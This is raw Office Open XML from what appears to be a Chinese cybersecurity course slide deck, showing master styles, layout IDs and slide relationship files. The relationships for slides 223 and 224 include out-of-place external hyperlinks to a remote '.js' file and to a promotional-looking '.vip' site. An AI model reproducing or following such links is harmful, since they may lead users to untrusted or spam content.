            <a:ext cx="228600" cy="3810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1177" name="Rectangle 153"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm>
            <a:off x="6705600" y="228600"/>
            <a:ext cx="228600" cy="1524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1178" name="Rectangle 154"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm>
            <a:off x="6858000" y="304800"/>
            <a:ext cx="304800" cy="3048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9224" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm>
            <a:off x="533400" y="1295400"/>
            <a:ext cx="81915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0" name="Rectangle 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="4"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm>
            <a:off x="4191000" y="6505575"/>
            <a:ext cx="8382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ea typeface="宋体" pitchFamily="2" charset="-122"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{48202818-BF81-436D-9D06-7FD86271C6A6}" type="slidenum">
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="Rectangle 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="2"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm>
            <a:off x="381000" y="6505575"/>
            <a:ext cx="19050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ea typeface="宋体" pitchFamily="2" charset="-122"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9228" name="Rectangle 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm>
            <a:off x="1116013" y="260350"/>
            <a:ext cx="6513512" cy="4873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pic>
        <p:nvPicPr>
          <p:cNvPr id="45" name="图片 16"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr userDrawn="1"/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId96"/>
          <a:srcRect/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="250825" y="80963"/>
            <a:ext cx="936625" cy="900112"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525">
            <a:noFill/>
            <a:miter lim="800000"/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="13" name="图片 12">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B9E7BD97-6B25-A9E7-A279-6E428CC166AA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr userDrawn="1"/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId97"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="-7351"/>
            <a:ext cx="9144000" cy="5372658"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
  </p:cSld>
  <p:clrMap bg1="lt1" tx1="dk1" bg2="lt2" tx2="dk2" accent1="accent1" accent2="accent2" accent3="accent3" accent4="accent4" accent5="accent5" accent6="accent6" hlink="hlink" folHlink="folHlink"/>
  <p:sldLayoutIdLst>
    <p:sldLayoutId id="2147483815" r:id="rId1"/>
    <p:sldLayoutId id="2147483801"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 id="2147483828" r:id="rId15"/>
    <p:sldLayoutId id="2147483829" r:id="rId16"/>
    <p:sldLayoutId id="2147483830" r:id="rId17"/>
    <p:sldLayoutId id="2147483831" r:id="rId18"/>
    <p:sldLayoutId id="2147483832" r:id="rId19"/>
    <p:sldLayoutId id="2147483833" r:id="rId20"/>
    <p:sldLayoutId id="2147483834" r:id="rId21"/>
    <p:sldLayoutId id="2147483835" r:id="rId22"/>
    <p:sldLayoutId id="2147483836" r:id="rId23"/>
    <p:sldLayoutId id="2147483837" r:id="rId24"/>
    <p:sldLayoutId id="2147483838" r:id="rId25"/>
    <p:sldLayoutId id="2147483839" r:id="rId26"/>
    <p:sldLayoutId id="2147483840" r:id="rId27"/>
    <p:sldLayoutId id="2147483841" r:id="rId28"/>
    <p:sldLayoutId id="2147483842" r:id="rId29"/>
    <p:sldLayoutId id="2147483843" r:id="rId30"/>
    <p:sldLayoutId id="2147483844" r:id="rId31"/>
    <p:sldLayoutId id="2147483845" r:id="rId32"/>
    <p:sldLayoutId id="2147483846" r:id="rId33"/>
    <p:sldLayoutId id="2147483847" r:id="rId34"/>
    <p:sldLayoutId id="2147483848" r:id="rId35"/>
    <p:sldLayoutId id="2147483849" r:id="rId36"/>
    <p:sldLayoutId id="2147483850" r:id="rId37"/>
    <p:sldLayoutId id="2147483851" r:id="rId38"/>
    <p:sldLayoutId id="2147483852" r:id="rId39"/>
    <p:sldLayoutId id="2147483853" r:id="rId40"/>
    <p:sldLayoutId id="2147483854" r:id="rId41"/>
    <p:sldLayoutId id="2147483855" r:id="rId42"/>
    <p:sldLayoutId id="2147483856" r:id="rId43"/>
    <p:sldLayoutId id="2147483857" r:id="rId44"/>
    <p:sldLayoutId id="2147483858" r:id="rId45"/>
    <p:sldLayoutId id="2147483859" r:id="rId46"/>
    <p:sldLayoutId id="2147483861" r:id="rId47"/>
    <p:sldLayoutId id="2147483862" r:id="rId48"/>
    <p:sldLayoutId id="2147483863" r:id="rId49"/>
    <p:sldLayoutId id="2147483864" r:id="rId50"/>
    <p:sldLayoutId id="2147483866" r:id="rId51"/>
    <p:sldLayoutId id="2147483867" r:id="rId52"/>
    <p:sldLayoutId id="2147483869" r:id="rId53"/>
    <p:sldLayoutId id="2147483870" r:id="rId54"/>
    <p:sldLayoutId id="2147483871" r:id="rId55"/>
    <p:sldLayoutId id="2147483872" r:id="rId56"/>
    <p:sldLayoutId id="2147483873" r:id="rId57"/>
    <p:sldLayoutId id="2147483874" r:id="rId58"/>
    <p:sldLayoutId id="2147483876" r:id="rId59"/>
    <p:sldLayoutId id="2147483877" r:id="rId60"/>
    <p:sldLayoutId id="2147483879" r:id="rId61"/>
    <p:sldLayoutId id="2147483880" r:id="rId62"/>
    <p:sldLayoutId id="2147483881" r:id="rId63"/>
    <p:sldLayoutId id="2147483882" r:id="rId64"/>
    <p:sldLayoutId id="2147483883" r:id="rId65"/>
    <p:sldLayoutId id="2147483884" r:id="rId66"/>
    <p:sldLayoutId id="2147483885" r:id="rId67"/>
    <p:sldLayoutId id="2147483886" r:id="rId68"/>
    <p:sldLayoutId id="2147483887" r:id="rId69"/>
    <p:sldLayoutId id="2147483888" r:id="rId70"/>
    <p:sldLayoutId id="2147483889" r:id="rId71"/>
    <p:sldLayoutId id="2147483890" r:id="rId72"/>
    <p:sldLayoutId id="2147483892" r:id="rId73"/>
    <p:sldLayoutId id="2147483894" r:id="rId74"/>
    <p:sldLayoutId id="2147483896" r:id="rId75"/>
    <p:sldLayoutId id="2147483897" r:id="rId76"/>
    <p:sldLayoutId id="2147483898" r:id="rId77"/>
    <p:sldLayoutId id="2147483899" r:id="rId78"/>
    <p:sldLayoutId id="2147483900" r:id="rId79"/>
    <p:sldLayoutId id="2147483901" r:id="rId80"/>
    <p:sldLayoutId id="2147483902" r:id="rId81"/>
    <p:sldLayoutId id="2147483903" r:id="rId82"/>
    <p:sldLayoutId id="2147483904" r:id="rId83"/>
    <p:sldLayoutId id="2147483905" r:id="rId84"/>
    <p:sldLayoutId id="2147483906" r:id="rId85"/>
    <p:sldLayoutId id="2147483907" r:id="rId86"/>
    <p:sldLayoutId id="2147483908" r:id="rId87"/>
    <p:sldLayoutId id="2147483909" r:id="rId88"/>
    <p:sldLayoutId id="2147483910" r:id="rId89"/>
    <p:sldLayoutId id="2147483912" r:id="rId90"/>
    <p:sldLayoutId id="2147483913" r:id="rId91"/>
    <p:sldLayoutId id="2147483914" r:id="rId92"/>
    <p:sldLayoutId id="2147483915" r:id="rId93"/>
    <p:sldLayoutId id="2147483916" r:id="rId94"/>
  </p:sldLayoutIdLst>
  <p:transition>
    <p:fade/>
  </p:transition>
  <p:hf hdr="0" ftr="0"/>
  <p:txStyles>
    <p:title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itchFamily="2" charset="-122"/>
          <a:ea typeface="黑体" pitchFamily="2" charset="-122"/>
        </a:defRPr>
      </a:lvl2pPr>
      <a:lvl3pPr algn="l" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="0"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr sz="3200" b="1">
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:latin typeface="黑体" pitchFamily="2" charset="-122"/>
          <a:ea typeface="黑体" pitchFamily="2" charset="-122"/>
        </a:defRPr>
      </a:lvl3pPr>
      <a:lvl4pPr algn="l" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="0"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr sz="3200" b="1">
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:latin typeface="黑体" pitchFamily="2" charset="-122"/>
          <a:ea typeface="黑体" pitchFamily="2" charset="-122"/>
        </a:defRPr>
      </a:lvl4pPr>
      <a:lvl5pPr algn="l" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="0"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr sz="3200" b="1">
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:latin typeface="黑体" pitchFamily="2" charset="-122"/>
          <a:ea typeface="黑体" pitchFamily="2" charset="-122"/>
        </a:defRPr>
      </a:lvl5pPr>
      <a:lvl6pPr marL="457200" algn="l" rtl="0" fontAlgn="base">
        <a:spcBef>
          <a:spcPct val="0"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr sz="3200" b="1">
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:latin typeface="黑体" pitchFamily="2" charset="-122"/>
          <a:ea typeface="黑体" pitchFamily="2" charset="-122"/>
        </a:defRPr>
      </a:lvl6pPr>
      <a:lvl7pPr marL="914400" algn="l" rtl="0" fontAlgn="base">
        <a:spcBef>
          <a:spcPct val="0"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr sz="3200" b="1">
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:latin typeface="黑体" pitchFamily="2" charset="-122"/>
          <a:ea typeface="黑体" pitchFamily="2" charset="-122"/>
        </a:defRPr>
      </a:lvl7pPr>
      <a:lvl8pPr marL="1371600" algn="l" rtl="0" fontAlgn="base">
        <a:spcBef>
          <a:spcPct val="0"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr sz="3200" b="1">
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:latin typeface="黑体" pitchFamily="2" charset="-122"/>
          <a:ea typeface="黑体" pitchFamily="2" charset="-122"/>
        </a:defRPr>
      </a:lvl8pPr>
      <a:lvl9pPr marL="1828800" algn="l" rtl="0" fontAlgn="base">
        <a:spcBef>
          <a:spcPct val="0"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr sz="3200" b="1">
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:latin typeface="黑体" pitchFamily="2" charset="-122"/>
          <a:ea typeface="黑体" pitchFamily="2" charset="-122"/>
        </a:defRPr>
      </a:lvl9pPr>
    </p:titleStyle>
    <p:bodyStyle>
      <a:lvl1pPr marL="342900" indent="-342900" algn="l" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="20000"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:buClr>
          <a:srgbClr val="3399FF"/>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charset="0"/>
          <a:ea typeface="+mn-ea"/>
        </a:defRPr>
      </a:lvl4pPr>
      <a:lvl5pPr marL="2057400" indent="-228600" algn="l" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="20000"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:buChar char="»"/>
        <a:defRPr sz="2000">
          <a:solidFill>
            <a:schemeClr val="tx1"/>
          </a:solidFill>
          <a:latin typeface="Arial" charset="0"/>
          <a:ea typeface="+mn-ea"/>
        </a:defRPr>
      </a:lvl5pPr>
      <a:lvl6pPr marL="2514600" indent="-228600" algn="l" rtl="0" fontAlgn="base">
        <a:spcBef>
          <a:spcPct val="20000"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:buChar char="»"/>
        <a:defRPr sz="2000">
          <a:solidFill>
            <a:schemeClr val="tx1"/>
          </a:solidFill>
          <a:latin typeface="Arial" charset="0"/>
          <a:ea typeface="+mn-ea"/>
        </a:defRPr>
      </a:lvl6pPr>
      <a:lvl7pPr marL="2971800" indent="-228600" algn="l" rtl="0" fontAlgn="base">
        <a:spcBef>
          <a:spcPct val="20000"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:buChar char="»"/>
        <a:defRPr sz="2000">
          <a:solidFill>
            <a:schemeClr val="tx1"/>
          </a:solidFill>
          <a:latin typeface="Arial" charset="0"/>
          <a:ea typeface="+mn-ea"/>
        </a:defRPr>
      </a:lvl7pPr>
      <a:lvl8pPr marL="3429000" indent="-228600" algn="l" rtl="0" fontAlgn="base">
        <a:spcBef>
          <a:spcPct val="20000"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:buChar char="»"/>
        <a:defRPr sz="2000">
          <a:solidFill>
            <a:schemeClr val="tx1"/>
          </a:solidFill>
          <a:latin typeface="Arial" charset="0"/>
          <a:ea typeface="+mn-ea"/>
        </a:defRPr>
      </a:lvl8pPr>
      <a:lvl9pPr marL="3886200" indent="-228600" algn="l" rtl="0" fontAlgn="base">
        <a:spcBef>
          <a:spcPct val="20000"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:buChar char="»"/>
        <a:defRPr sz="2000">
          <a:solidFill>
            <a:schemeClr val="tx1"/>
          </a:solidFill>
          <a:latin typeface="Arial"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27.wmf"/></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oleObject" Target="../embeddings/oleObject6.bin"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/audio" Target="../media/audio2.wav"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="../embeddings/oleObject3.bin"/><Relationship Id="rId12" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image35.png"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/audio" Target="../media/audio1.wav"/><Relationship Id="rId16" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image37.wmf"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout2.xml"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image32.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34.png"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/audio" Target="../media/audio3.wav"/><Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="../embeddings/oleObject4.bin"/><Relationship Id="rId14" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image36.png"/></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6.jpg"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image60.png"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image55.jp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jpg"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide82.xml.rels><?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId8" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image67.jpeg"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image62.jpg"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image66.jpg"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image61.jpg"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout2.xml"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image65.jpg"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image64.jpeg"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image63.jpeg"/><Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image68.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9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7.jp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9.emf"/><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92.jpg"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image91.jpeg"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout2.xml"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image94.jpg"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image93.jpe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97.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99.emf"/><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13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0.xml"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide14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141.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4.xml"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide14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14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6.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15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153.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4.xml"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide154.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5.xml"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide15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15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7.xml"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide157.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61.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3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4.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7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37.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout90.xml"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image121.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide17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8.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout91.xml"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide17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39.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout92.xml"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide17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40.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout93.xml"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image125.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide17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41.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout9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7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42.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout44.xml"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image128.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide180.xml.rels><?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:stopstorage@qq.com" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="../notesSlides/notesSlide43.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout45.xml"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image129.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide18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46.xml"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide182.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47.xml"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide18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44.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout48.xml"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image135.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8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5.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout50.xml"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide186.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51.xml"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide187.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6.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout5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4.xml"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide19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55.xml"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image143.png"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image142.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide19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43.png"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout56.xml"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image141.png"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image142.png"/></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7.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8.xml"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide194.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59.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4.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201.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66.xml"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide202.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image" Target="../media/image146.png"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout67.xml"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide203.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68.xml"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide204.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69.xml"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide205.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52.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout70.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07.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72.xml"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide20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73.xml"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide20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74.xml"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide210.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75.xml"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide211.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76.xml"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide212.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77.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8.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1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54.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout80.xml"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide216.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8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8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85.xml"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide221.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86.xml"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide222.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57.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout87.xml"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide223.xml.rels><?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.gssdlc.com/nb.js" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="../notesSlides/notesSlide58.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout88.xml"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.444332.vip/?channel=P00142\" TargetMode="External"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide224.xml.rels><?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.444332.vip/?channel=P00142\" TargetMode="External"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout89.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973138" y="2611438"/>
            <a:ext cx="7485062" cy="978729"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525">
            <a:noFill/>
            <a:miter lim="800000"/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:schemeClr val="folHlink"/>
              </a:buClr>
              <a:buSzPct val="60000"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="4800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst>
                  <a:outerShdw blurRad="38100" dist="38100" dir="2700000" algn="tl">
                    <a:srgbClr val="000000">
                      <a:alpha val="43137"/>
                    </a:srgbClr>
                  </a:outerShdw>
                </a:effectLst>
                <a:latin typeface="Tahoma" pitchFamily="34" charset="0"/>
                <a:ea typeface="黑体" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>网络空间安全技术</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="4800" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst>
                <a:outerShdw blurRad="38100" dist="38100" dir="2700000" algn="tl">
                  <a:srgbClr val="000000">
                    <a:alpha val="43137"/>
                  </a:srgbClr>
                </a:outerShdw>
              </a:effectLst>
              <a:latin typeface="Tahoma" pitchFamily="34" charset="0"/>
              <a:ea typeface="黑体" pitchFamily="2" charset="-122"/>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475656" y="2636912"/>
            <a:ext cx="7193449" cy="830997"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="4800" b="1" dirty="0">
                <a:latin typeface="黑体" pitchFamily="2" charset="-122"/>
                <a:ea typeface="黑体" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>信息与网络空间安全保障</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
